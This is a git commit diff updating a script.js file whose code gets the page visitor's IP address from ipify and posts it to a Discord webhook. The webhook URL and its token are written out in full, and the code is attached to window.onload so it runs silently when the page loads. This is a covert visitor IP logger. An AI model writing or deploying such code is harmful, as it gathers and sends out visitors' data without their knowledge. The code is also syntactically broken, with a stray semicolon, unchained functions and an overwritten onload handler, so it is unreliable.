f73f05ff37d20c7e6841bf5f0ec5f0d2db53df2c
Tripl3S1x <120041039+Tripl3S1x@users.noreply.github.com>
2023-07-06 03:10:55 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,9 +1,10 @@
 var ip = '';
 fetch("https://api.ipify.org/?format=json");
-.then(function(response) {
+function x(response) {
   return response.json();
-})
-.then(function(data) {
+}
+
+function y(data) {
   ip = data.ip;
   var webhook = "https://discord.com/api/webhooks/1126295689748553841/xQ_9FQHol7Uj9afyn54a_W1NfCykITR-7lPyPhY1xINoZ84x-5_Ht83U3e2JM9vFoPgj";
   var message = {
@@ -15,5 +16,8 @@ fetch("https://api.ipify.org/?format=json");
       "Content-Type": "application/json"
     },
     body: JSON.stringify(message)
-  }};
+  };
 };
+
+window.onload = y;
+window.onload = x;
